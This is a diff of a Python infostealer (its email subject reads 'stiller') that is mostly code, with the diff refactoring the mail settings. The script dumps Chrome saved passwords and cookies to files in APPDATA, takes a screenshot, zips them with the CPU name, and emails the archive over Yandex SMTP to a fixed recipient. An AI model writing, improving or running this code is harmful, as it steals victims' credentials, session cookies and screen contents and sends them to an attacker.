@@ -12,7 +12,12 @@ from email import encoders
 from PIL import ImageGrab
 import platform
 
-
+# setup
+from_email = "mail@mail.com" # sender email
+to_email = "mail2@mail.com" # recipient email
+email_passworld = "PASSWORLD" #passworld from sender email
+smtp = "smtp.yandex.ru" # smtp server address
+smtp_port = 587 # smtp port
 print("V0.2")
 
 file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
@@ -35,10 +40,11 @@ file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+")
 file.write(cookies.chrome() + '\n')
 file.close()
 
+# creating screenshots
 screen = ImageGrab.grab()
 screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')
 
-
+# creating zip file
 zname= 'C:\\Users\\'+getpass.getuser()+'\\AppData\\log.zip'
 newzip=zipfile.ZipFile(zname,'w')
 newzip.write(os.getenv("APPDATA") + '\\google_pass.txt')
@@ -50,13 +56,11 @@ newzip.write(os.getenv("APPDATA") + '\\sreenshot.jpg')
 newzip.close()
 
 
-fromaddr = "mail@mail.com" # email to send
-toaddr = "mail2@mail.com"  #recipient's mail
-
+# send mail
 msg = MIMEMultipart()
 
-msg['From'] = fromaddr
-msg['To'] = toaddr
+msg['From'] = from_email
+msg['To'] = to_email
 msg['Subject'] = getpass.getuser()+" stiller"
 
 body = "cpu: "+ platform.processor()
@@ -66,7 +70,6 @@ msg.attach(MIMEText(body, 'plain'))
 filename = "log.zip"
 attachment = open('C:\\Users\\'+getpass.getuser() + '\\AppData\\log.zip', "rb")
 
-
 part = MIMEBase('application', 'octet-stream')
 part.set_payload((attachment).read())
 encoders.encode_base64(part)
@@ -74,12 +77,10 @@ part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
 msg.attach(part)
 
-
-server = smtplib.SMTP('smtp.yandex.com', 587) #smtp server
-
+server = smtplib.SMTP(smtp, smtp_port)
 server.starttls()
-server.login(fromaddr, "passworld")  #mail passworld
+server.login(from_email, email_passworld)
 text = msg.as_string()
-server.sendmail(fromaddr, toaddr, text)
+server.sendmail(from_email, to_email, text)
 server.quit()
-print("OK")
+print("finish")
